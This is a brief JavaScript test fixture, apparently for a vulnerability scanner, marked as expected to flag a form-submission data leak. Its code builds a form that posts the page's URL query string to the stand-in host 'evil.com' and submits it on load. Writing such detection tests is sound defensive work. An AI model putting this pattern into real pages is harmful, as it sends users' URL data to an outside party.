/**
 * Test: Form submission data leak
 * Expected: VULNERABILITY - URL params in form action
 */

function test() {
  var search = window.location.search;
  var form = document.createElement('form');
  form.action = 'https://evil.com/submit' + search;
  form.method = 'POST';
  
  document.body.appendChild(form);
  form.submit();
}

test();